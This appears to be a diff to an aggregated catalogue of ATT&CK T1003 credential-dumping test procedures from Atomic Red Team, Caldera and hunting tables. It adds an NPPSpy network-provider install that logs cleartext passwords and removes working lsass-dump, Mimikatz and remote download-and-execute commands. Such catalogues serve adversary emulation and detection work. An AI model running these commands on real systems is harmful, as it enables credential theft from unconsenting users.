@@ -54,12 +54,17 @@ PathToAtomicsFolder\T1003\bin\gsecdump.exe -a
 
 #{gsecdump_exe} -a
 
-{'windows': {'psh': {'command': 'Import-Module .\\PowerView.ps1 -Force;\nGet-NetComputer\n', 'payloads': ['powerview.ps1']}}}
-{'windows': {'psh': {'command': '$ps_url = "https://download.sysinternals.com/files/Procdump.zip";\n$download_folder = "C:\\Users\\Public\\";\n$staging_folder = "C:\\Users\\Public\\temp";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder"Procdump.zip" -DestinationPath $staging_folder;\n$arch=[System.Environment]::Is64BitOperatingSystem;\n\nif ($arch) {\n    iex $staging_folder"\\procdump64.exe -accepteula -ma lsass.exe" > $env:APPDATA\\error.dmp 2>&1;\n} else {\n    iex $staging_folder"\\procdump.exe -accepteula -ma lsass.exe" > $env:APPDATA\\error.dmp 2>&1;\n}\nremove-item $staging_folder -Recurse;\n'}}}
-{'windows': {'psh': {'command': '.\\totallylegit.exe #{host.process.id} C:\\Users\\Public\\creds.dmp\n', 'payloads': ['totallylegit.exe']}}}
-{'windows': {'psh': {'command': 'Import-Module .\\invoke-mimi.ps1;\nInvoke-Mimikatz -DumpCreds\n', 'parsers': {'plugins.stockpile.app.parsers.katz': [{'source': 'domain.user.name', 'edge': 'has_password', 'target': 'domain.user.password'}, {'source': 'domain.user.name', 'edge': 'has_hash', 'target': 'domain.user.ntlm'}, {'source': 'domain.user.name', 'edge': 'has_hash', 'target': 'domain.user.sha1'}]}, 'payloads': ['invoke-mimi.ps1']}}}
-{'windows': {'psh': {'command': 'reg query HKLM /f password /t REG_SZ /s\n'}}}
-{'windows': {'psh': {'command': '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1");\niex $result; Invoke-Mimikatz -DumpCreds\n', 'parsers': {'plugins.stockpile.app.parsers.katz': [{'source': 'domain.user.name', 'edge': 'has_password', 'target': 'domain.user.password'}]}}}}
+Copy-Item "$env:Temp\NPPSPY.dll" -Destination "C:\Windows\System32"
+$path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
+$UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy"
+Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue
+$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore
+$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore
+$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Class" -Value 2 -ErrorAction Ignore
+$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Name" -Value NPPSpy -ErrorAction Ignore
+$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\NPPSPY.dll" -ErrorAction Ignore
+echo "[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt"
+{'windows': {'psh': {'command': '.\\totallylegit.exe #{host.process.id} C:\\Users\\Public\\creds.dmp\n', 'payloads': ['totallylegit.exe'], 'cleanup': 'if (Test-Path "C:\\Users\\Public\\creds.dmp") {\n  rm "C:\\Users\\Public\\creds.dmp" -Force;\n};\n'}}}
 ntdsutil.exe
 HKLM\SAM|HKLM\Security\\Windows\\.+\\lsass.exe
 \\Windows\\.+\\bcryptprimitives.dll|\\Windows\\.+\\bcrypt.dll|\\Windows\\.+\\ncrypt.dll
@@ -167,81 +172,47 @@ python/situational_awareness/network/dcos/etcd_crawler
  {'command': '#{gsecdump_exe} -a\n',
   'name': None,
   'source': 'atomics/T1003/T1003.yaml'},
- {'command': {'windows': {'psh': {'command': 'Import-Module .\\PowerView.ps1 '
+ {'command': 'Copy-Item "$env:Temp\\NPPSPY.dll" -Destination '
+             '"C:\\Windows\\System32"\n'
+             '$path = Get-ItemProperty -Path '
+             '"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order" '
+             '-Name PROVIDERORDER\n'
+             '$UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy"\n'
+             'Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value '
+             '$UpdatedValue\n'
+             '$rv = New-Item -Path '
+             'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy -ErrorAction '
+             'Ignore\n'
+             '$rv = New-Item -Path '
+             'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider '
+             '-ErrorAction Ignore\n'
+             '$rv = New-ItemProperty -Path '
+             'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider '
+             '-Name "Class" -Value 2 -ErrorAction Ignore\n'
+             '$rv = New-ItemProperty -Path '
+             'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider '
+             '-Name "Name" -Value NPPSpy -ErrorAction Ignore\n'
+             '$rv = New-ItemProperty -Path '
+             'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider '
+             '-Name "ProviderPath" -PropertyType ExpandString -Value '
+             '"%SystemRoot%\\System32\\NPPSPY.dll" -ErrorAction Ignore\n'
+             'echo "[!] Please, logout and log back in. Cleartext password for '
+             'this account is going to be located in C:\\NPPSpy.txt"',
+  'name': None,
+  'source': 'atomics/T1003/T1003.yaml'},
+ {'command': {'windows': {'psh': {'cleanup': 'if (Test-Path '
+                                             '"C:\\Users\\Public\\creds.dmp") '
+                                             '{\n'
+                                             '  rm '
+                                             '"C:\\Users\\Public\\creds.dmp" '
                                              '-Force;\n'
-                                             'Get-NetComputer\n',
-                                  'payloads': ['powerview.ps1']}}},
-  'name': 'Get a list of all computers in a domain',
-  'source': 'data/abilities/credential-access/0360ede1-3c28-48d3-a6ef-6e98f562c5af.yml'},
- {'command': {'windows': {'psh': {'command': '$ps_url = '
-                                             '"https://download.sysinternals.com/files/Procdump.zip";\n'
-                                             '$download_folder = '
-                                             '"C:\\Users\\Public\\";\n'
-                                             '$staging_folder = '
-                                             '"C:\\Users\\Public\\temp";\n'
-                                             'Start-BitsTransfer -Source '
-                                             '$ps_url -Destination '
-                                             '$download_folder;\n'
-                                             'Expand-Archive -LiteralPath '
-                                             '$download_folder"Procdump.zip" '
-                                             '-DestinationPath '
-                                             '$staging_folder;\n'
-                                             '$arch=[System.Environment]::Is64BitOperatingSystem;\n'
-                                             '\n'
-                                             'if ($arch) {\n'
-                                             '    iex '
-                                             '$staging_folder"\\procdump64.exe '
-                                             '-accepteula -ma lsass.exe" > '
-                                             '$env:APPDATA\\error.dmp 2>&1;\n'
-                                             '} else {\n'
-                                             '    iex '
-                                             '$staging_folder"\\procdump.exe '
-                                             '-accepteula -ma lsass.exe" > '
-                                             '$env:APPDATA\\error.dmp 2>&1;\n'
-                                             '}\n'
-                                             'remove-item $staging_folder '
-                                             '-Recurse;\n'}}},
-  'name': 'Dump lsass for later use with mimikatz',
-  'source': 'data/abilities/credential-access/0ef4cc7b-611c-4237-b20b-db36b6906554.yml'},
- {'command': {'windows': {'psh': {'command': '.\\totallylegit.exe '
+                                             '};\n',
+                                  'command': '.\\totallylegit.exe '
                                              '#{host.process.id} '
                                              'C:\\Users\\Public\\creds.dmp\n',
                                   'payloads': ['totallylegit.exe']}}},
   'name': 'Custom GO credential dumper using minidumpwritedump',
   'source': 'data/abilities/credential-access/3c647015-ab0a-496a-8847-6ab173cd2b22.yml'},
- {'command': {'windows': {'psh': {'command': 'Import-Module '
-                                             '.\\invoke-mimi.ps1;\n'
-                                             'Invoke-Mimikatz -DumpCreds\n',
-                                  'parsers': {'plugins.stockpile.app.parsers.katz': [{'edge': 'has_password',
-                                                                                      'source': 'domain.user.name',
-                                                                                      'target': 'domain.user.password'},
-                                                                                     {'edge': 'has_hash',
-                                                                                      'source': 'domain.user.name',
-                                                                                      'target': 'domain.user.ntlm'},
-                                                                                     {'edge': 'has_hash',
-                                                                                      'source': 'domain.user.name',
-                                                                                      'target': 'domain.user.sha1'}]},
-                                  'payloads': ['invoke-mimi.ps1']}}},
-  'name': 'Use Invoke-Mimikatz',
-  'source': 'data/abilities/credential-access/7049e3ec-b822-4fdf-a4ac-18190f9b66d1.yml'},
- {'command': {'windows': {'psh': {'command': 'reg query HKLM /f password /t '
-                                             'REG_SZ /s\n'}}},
-  'name': 'Search for possible credentials stored in the HKLM Hive',
-  'source': 'data/abilities/credential-access/98e58fc4-3843-4511-89b1-50cb872e0c9b.yml'},
- {'command': {'windows': {'psh': {'command': '[System.Net.ServicePointManager]::ServerCertificateValidationCallback '
-                                             '= { $True };\n'
-                                             '$web = (New-Object '
-                                             'System.Net.WebClient);\n'
-                                             '$result = '
-                                             '$web.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1");\n'
-                                             'iex $result; Invoke-Mimikatz '
-                                             '-DumpCreds\n',
-                                  'parsers': {'plugins.stockpile.app.parsers.katz': [{'edge': 'has_password',
-                                                                                      'source': 'domain.user.name',
-                                                                                      'target': 'domain.user.password'}]}}}},
-  'name': 'Use powerkatz to execute mimikatz and attempt to grab plaintext '
-          'and/or hashed passwords',
-  'source': 'data/abilities/credential-access/baac2c6d-4652-4b7e-ab0a-f1bf246edd12.yml'},
  {'command': 'ntdsutil.exe',
   'name': 'parent_process',
   'source': 'Threat Hunting Tables'},
@@ -1379,98 +1350,201 @@ python/situational_awareness/network/dcos/etcd_crawler
                                                                                                                          'file',
                                                                                                           'type': 'url'}},
                                                                      'name': 'Gsecdump',
+                                                                     'supported_platforms': ['windows']},
+                                                                    {'auto_generated_guid': '9e2173c0-ba26-4cdf-b0ed-8c54b27e3ad6',
+                                                                     'dependencies': [{'description': 'NPPSpy.dll '
+                                                                                                      'must '
+                                                                                                      'be '
+                                                                                                      'available '
+                                                                                                      'in '
+                                                                                                      'local '
+                                                                                                      'temp '
+                                                                                                      'directory',
+                                                                                       'get_prereq_command': 'Invoke-WebRequest '
+                                                                                                             '-Uri '
+                                                                                                             'https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll '
+                                                                                                             '-OutFile '
+                                                                                                             '"$env:Temp\\NPPSPY.dll"',
+                                                                                       'prereq_command': 'if '
+                                                                                                         '(Test-Path '
+                                                                                                         '"$env:Temp\\NPPSPY.dll") '
+                                                                                                         '{exit '
+                                                                                                         '0} '
+                                                                                                         'else '
+                                                                                                         '{exit '
+                                                                                                         '1}'}],
+                                                                     'dependency_executor_name': 'powershell',
+                                                                     'description': 'Changes '
+                                                                                    'ProviderOrder '
+                                                                                    'Registry '
+                                                                                    'Key '
+                                                                                    'Parameter '
+                                                                                    'and '
+                                                                                    'creates '
+                                                                                    'Key '
+                                                                                    'for '
+                                                                                    'NPPSpy.\n'
+                                                                                    'After '
+                                                                                    "user's "
+                                                                                    'logging '
+                                                                                    'in '
+                                                                                    'cleartext '
+                                                                                    'password '
+                                                                                    'is '
+                                                                                    'saved '
+                                                                                    'in '
+                                                                                    'C:\\NPPSpy.txt.\n'
+                                                                                    'Clean '
+                                                                                    'up '
+                                                                                    'deletes '
+                                                                                    'the '
+                                                                                    'files '
+                                                                                    'and '
+                                                                                    'reverses '
+                                                                                    'Registry '
+                                                                                    'changes.\n'
+                                                                                    'NPPSpy '
+                                                                                    'Source: '
+                                                                                    'https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy',
+                                                                     'executor': {'cleanup_command': '$cleanupPath '
+                                                                                                     '= '
+                                                                                                     'Get-ItemProperty '
+                                                                                                     '-Path '
+                                                                                                     '"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order" '
+                                                                                                     '-Name '
+                                                                                                     'PROVIDERORDER\n'
+                                                                                                     '$cleanupUpdatedValue '
+                                                                                                     '= '
+                                                                                                     '$cleanupPath.PROVIDERORDER \n'
+                                                                                                     '$cleanupUpdatedValue '
+                                                                                                     '= '
+                                                                                                     '$cleanupUpdatedValue '
+                                                                                                     '-replace '
+                                                                                                     "',NPPSpy',''\n"
+                                                                                                     'Set-ItemProperty '
+                                                                                                     '-Path '
+                                                                                                     '$cleanupPath.PSPath '
+                                                                                                     '-Name '
+                                                                                                     '"PROVIDERORDER" '
+                                                                                                     '-Value '
+                                                                                                     '$cleanupUpdatedValue\n'
+                                                                                                     'Remove-Item '
+                                                                                                     '-Path '
+                                                                                                     '"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy" '
+                                                                                                     '-Recurse '
+                                                                                                     '-ErrorAction '
+                                                                                                     'Ignore\n'
+                                                                                                     'Remove-Item '
+                                                                                                     'C:\\NPPSpy.txt '
+                                                                                                     '-ErrorAction '
+                                                                                                     'Ignore\n'
+                                                                                                     'Remove-Item '
+                                                                                                     'C:\\Windows\\System32\\NPPSpy.dll '
+                                                                                                     '-ErrorAction '
+                                                                                                     'Ignore',
+                                                                                  'command': 'Copy-Item '
+                                                                                             '"$env:Temp\\NPPSPY.dll" '
+                                                                                             '-Destination '
+                                                                                             '"C:\\Windows\\System32"\n'
+                                                                                             '$path '
+                                                                                             '= '
+                                                                                             'Get-ItemProperty '
+                                                                                             '-Path '
+                                                                                             '"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order" '
+                                                                                             '-Name '
+                                                                                             'PROVIDERORDER\n'
+                                                                                             '$UpdatedValue '
+                                                                                             '= '
+                                                                                             '$Path.PROVIDERORDER '
+                                                                                             '+ '
+                                                                                             '",NPPSpy"\n'
+                                                                                             'Set-ItemProperty '
+                                                                                             '-Path '
+                                                                                             '$Path.PSPath '
+                                                                                             '-Name '
+                                                                                             '"PROVIDERORDER" '
+                                                                                             '-Value '
+                                                                                             '$UpdatedValue\n'
+                                                                                             '$rv '
+                                                                                             '= '
+                                                                                             'New-Item '
+                                                                                             '-Path '
+                                                                                             'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy '
+                                                                                             '-ErrorAction '
+                                                                                             'Ignore\n'
+                                                                                             '$rv '
+                                                                                             '= '
+                                                                                             'New-Item '
+                                                                                             '-Path '
+                                                                                             'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider '
+                                                                                             '-ErrorAction '
+                                                                                             'Ignore\n'
+                                                                                             '$rv '
+                                                                                             '= '
+                                                                                             'New-ItemProperty '
+                                                                                             '-Path '
+                                                                                             'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider '
+                                                                                             '-Name '
+                                                                                             '"Class" '
+                                                                                             '-Value '
+                                                                                             '2 '
+                                                                                             '-ErrorAction '
+                                                                                             'Ignore\n'
+                                                                                             '$rv '
+                                                                                             '= '
+                                                                                             'New-ItemProperty '
+                                                                                             '-Path '
+                                                                                             'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider '
+                                                                                             '-Name '
+                                                                                             '"Name" '
+                                                                                             '-Value '
+                                                                                             'NPPSpy '
+                                                                                             '-ErrorAction '
+                                                                                             'Ignore\n'
+                                                                                             '$rv '
+                                                                                             '= '
+                                                                                             'New-ItemProperty '
+                                                                                             '-Path '
+                                                                                             'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider '
+                                                                                             '-Name '
+                                                                                             '"ProviderPath" '
+                                                                                             '-PropertyType '
+                                                                                             'ExpandString '
+                                                                                             '-Value '
+                                                                                             '"%SystemRoot%\\System32\\NPPSPY.dll" '
+                                                                                             '-ErrorAction '
+                                                                                             'Ignore\n'
+                                                                                             'echo '
+                                                                                             '"[!] '
+                                                                                             'Please, '
+                                                                                             'logout '
+                                                                                             'and '
+                                                                                             'log '
+                                                                                             'back '
+                                                                                             'in. '
+                                                                                             'Cleartext '
+                                                                                             'password '
+                                                                                             'for '
+                                                                                             'this '
+                                                                                             'account '
+                                                                                             'is '
+                                                                                             'going '
+                                                                                             'to '
+                                                                                             'be '
+                                                                                             'located '
+                                                                                             'in '
+                                                                                             'C:\\NPPSpy.txt"',
+                                                                                  'elevation_required': True,
+                                                                                  'name': 'powershell'},
+                                                                     'name': 'Credential '
+                                                                             'Dumping '
+                                                                             'with '
+                                                                             'NPPSpy',
                                                                      'supported_platforms': ['windows']}],
                                                    'attack_technique': 'T1003',
                                                    'display_name': 'OS '
                                                                    'Credential '
                                                                    'Dumping'}},
- {'Mitre Stockpile - Get a list of all computers in a domain': {'description': 'Get '
-                                                                               'a '
-                                                                               'list '
-                                                                               'of '
-                                                                               'all '
-                                                                               'computers '
-                                                                               'in '
-                                                                               'a '
-                                                                               'domain',
-                                                                'id': '0360ede1-3c28-48d3-a6ef-6e98f562c5af',
-                                                                'name': 'GetComputers '
-                                                                        '(Alice)',
-                                                                'platforms': {'windows': {'psh': {'command': 'Import-Module '
-                                                                                                             '.\\PowerView.ps1 '
-                                                                                                             '-Force;\n'
-                                                                                                             'Get-NetComputer\n',
-                                                                                                  'payloads': ['powerview.ps1']}}},
-                                                                'tactic': 'credential-access',
-                                                                'technique': {'attack_id': 'T1003',
-                                                                              'name': 'Credential '
-                                                                                      'Dumping'}}},
- {'Mitre Stockpile - Dump lsass for later use with mimikatz': {'description': 'Dump '
-                                                                              'lsass '
-                                                                              'for '
-                                                                              'later '
-                                                                              'use '
-                                                                              'with '
-                                                                              'mimikatz',
-                                                               'id': '0ef4cc7b-611c-4237-b20b-db36b6906554',
-                                                               'name': 'Leverage '
-                                                                       'Procdump '
-                                                                       'for '
-                                                                       'lsass '
-                                                                       'memory',
-                                                               'platforms': {'windows': {'psh': {'command': '$ps_url '
-                                                                                                            '= '
-                                                                                                            '"https://download.sysinternals.com/files/Procdump.zip";\n'
-                                                                                                            '$download_folder '
-                                                                                                            '= '
-                                                                                                            '"C:\\Users\\Public\\";\n'
-                                                                                                            '$staging_folder '
-                                                                                                            '= '
-                                                                                                            '"C:\\Users\\Public\\temp";\n'
-                                                                                                            'Start-BitsTransfer '
-                                                                                                            '-Source '
-                                                                                                            '$ps_url '
-                                                                                                            '-Destination '
-                                                                                                            '$download_folder;\n'
-                                                                                                            'Expand-Archive '
-                                                                                                            '-LiteralPath '
-                                                                                                            '$download_folder"Procdump.zip" '
-                                                                                                            '-DestinationPath '
-                                                                                                            '$staging_folder;\n'
-                                                                                                            '$arch=[System.Environment]::Is64BitOperatingSystem;\n'
-                                                                                                            '\n'
-                                                                                                            'if '
-                                                                                                            '($arch) '
-                                                                                                            '{\n'
-                                                                                                            '    '
-                                                                                                            'iex '
-                                                                                                            '$staging_folder"\\procdump64.exe '
-                                                                                                            '-accepteula '
-                                                                                                            '-ma '
-                                                                                                            'lsass.exe" '
-                                                                                                            '> '
-                                                                                                            '$env:APPDATA\\error.dmp '
-                                                                                                            '2>&1;\n'
-                                                                                                            '} '
-                                                                                                            'else '
-                                                                                                            '{\n'
-                                                                                                            '    '
-                                                                                                            'iex '
-                                                                                                            '$staging_folder"\\procdump.exe '
-                                                                                                            '-accepteula '
-                                                                                                            '-ma '
-                                                                                                            'lsass.exe" '
-                                                                                                            '> '
-                                                                                                            '$env:APPDATA\\error.dmp '
-                                                                                                            '2>&1;\n'
-                                                                                                            '}\n'
-                                                                                                            'remove-item '
-                                                                                                            '$staging_folder '
-                                                                                                            '-Recurse;\n'}}},
-                                                               'tactic': 'credential-access',
-                                                               'technique': {'attack_id': 'T1003',
-                                                                             'name': 'Credential '
-                                                                                     'Dumping'}}},
  {'Mitre Stockpile - Custom GO credential dumper using minidumpwritedump': {'description': 'Custom '
                                                                                            'GO '
                                                                                            'credential '
@@ -1480,102 +1554,25 @@ python/situational_awareness/network/dcos/etcd_crawler
                                                                             'id': '3c647015-ab0a-496a-8847-6ab173cd2b22',
                                                                             'name': 'MiniDumpWriteDump '
                                                                                     '(Spooky)',
-                                                                            'platforms': {'windows': {'psh': {'command': '.\\totallylegit.exe '
+                                                                            'platforms': {'windows': {'psh': {'cleanup': 'if '
+                                                                                                                         '(Test-Path '
+                                                                                                                         '"C:\\Users\\Public\\creds.dmp") '
+                                                                                                                         '{\n'
+                                                                                                                         '  '
+                                                                                                                         'rm '
+                                                                                                                         '"C:\\Users\\Public\\creds.dmp" '
+                                                                                                                         '-Force;\n'
+                                                                                                                         '};\n',
+                                                                                                              'command': '.\\totallylegit.exe '
                                                                                                                          '#{host.process.id} '
                                                                                                                          'C:\\Users\\Public\\creds.dmp\n',
                                                                                                               'payloads': ['totallylegit.exe']}}},
                                                                             'requirements': [{'plugins.stockpile.app.requirements.paw_provenance': [{'source': 'host.process.id'}]}],
                                                                             'tactic': 'credential-access',
                                                                             'technique': {'attack_id': 'T1003',
-                                                                                          'name': 'Credential '
+                                                                                          'name': 'OS '
+                                                                                                  'Credential '
                                                                                                   'Dumping'}}},
- {'Mitre Stockpile - Use Invoke-Mimikatz': {'description': 'Use '
-                                                           'Invoke-Mimikatz',
-                                            'id': '7049e3ec-b822-4fdf-a4ac-18190f9b66d1',
-                                            'name': 'Powerkatz (Staged)',
-                                            'platforms': {'windows': {'psh': {'command': 'Import-Module '
-                                                                                         '.\\invoke-mimi.ps1;\n'
-                                                                                         'Invoke-Mimikatz '
-                                                                                         '-DumpCreds\n',
-                                                                              'parsers': {'plugins.stockpile.app.parsers.katz': [{'edge': 'has_password',
-                                                                                                                                  'source': 'domain.user.name',
-                                                                                                                                  'target': 'domain.user.password'},
-                                                                                                                                 {'edge': 'has_hash',
-                                                                                                                                  'source': 'domain.user.name',
-                                                                                                                                  'target': 'domain.user.ntlm'},
-                                                                                                                                 {'edge': 'has_hash',
-                                                                                                                                  'source': 'domain.user.name',
-                                                                                                                                  'target': 'domain.user.sha1'}]},
-                                                                              'payloads': ['invoke-mimi.ps1']}}},
-                                            'privilege': 'Elevated',
-                                            'tactic': 'credential-access',
-                                            'technique': {'attack_id': 'T1003',
-                                                          'name': 'Credential '
-                                                                  'Dumping'}}},
- {'Mitre Stockpile - Search for possible credentials stored in the HKLM Hive': {'description': 'Search '
-                                                                                               'for '
-                                                                                               'possible '
-                                                                                               'credentials '
-                                                                                               'stored '
-                                                                                               'in '
-                                                                                               'the '
-                                                                                               'HKLM '
-                                                                                               'Hive',
-                                                                                'id': '98e58fc4-3843-4511-89b1-50cb872e0c9b',
-                                                                                'name': 'Credentials '
-                                                                                        'in '
-                                                                                        'Registry',
-                                                                                'platforms': {'windows': {'psh': {'command': 'reg '
-                                                                                                                             'query '
-                                                                                                                             'HKLM '
-                                                                                                                             '/f '
-                                                                                                                             'password '
-                                                                                                                             '/t '
-                                                                                                                             'REG_SZ '
-                                                                                                                             '/s\n'}}},
-                                                                                'tactic': 'credential-access',
-                                                                                'technique': {'attack_id': 'T1003',
-                                                                                              'name': 'Credential '
-                                                                                                      'Dumping'}}},
- {'Mitre Stockpile - Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords': {'description': 'Use '
-                                                                                                                               'powerkatz '
-                                                                                                                               'to '
-                                                                                                                               'execute '
-                                                                                                                               'mimikatz '
-                                                                                                                               'and '
-                                                                                                                               'attempt '
-                                                                                                                               'to '
-                                                                                                                               'grab '
-                                                                                                                               'plaintext '
-                                                                                                                               'and/or '
-                                                                                                                               'hashed '
-                                                                                                                               'passwords',
-                                                                                                                'id': 'baac2c6d-4652-4b7e-ab0a-f1bf246edd12',
-                                                                                                                'name': 'Run '
-                                                                                                                        'PowerKatz',
-                                                                                                                'platforms': {'windows': {'psh': {'command': '[System.Net.ServicePointManager]::ServerCertificateValidationCallback '
-                                                                                                                                                             '= '
-                                                                                                                                                             '{ '
-                                                                                                                                                             '$True '
-                                                                                                                                                             '};\n'
-                                                                                                                                                             '$web '
-                                                                                                                                                             '= '
-                                                                                                                                                             '(New-Object '
-                                                                                                                                                             'System.Net.WebClient);\n'
-                                                                                                                                                             '$result '
-                                                                                                                                                             '= '
-                                                                                                                                                             '$web.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1");\n'
-                                                                                                                                                             'iex '
-                                                                                                                                                             '$result; '
-                                                                                                                                                             'Invoke-Mimikatz '
-                                                                                                                                                             '-DumpCreds\n',
-                                                                                                                                                  'parsers': {'plugins.stockpile.app.parsers.katz': [{'edge': 'has_password',
-                                                                                                                                                                                                      'source': 'domain.user.name',
-                                                                                                                                                                                                      'target': 'domain.user.password'}]}}}},
-                                                                                                                'tactic': 'credential-access',
-                                                                                                                'technique': {'attack_id': 'T1003',
-                                                                                                                              'name': 'Credential '
-                                                                                                                                      'Dumping'}}},
  {'Threat Hunting Tables': {'chain_id': '100053',
                             'commandline_string': '',
                             'file_path': '',
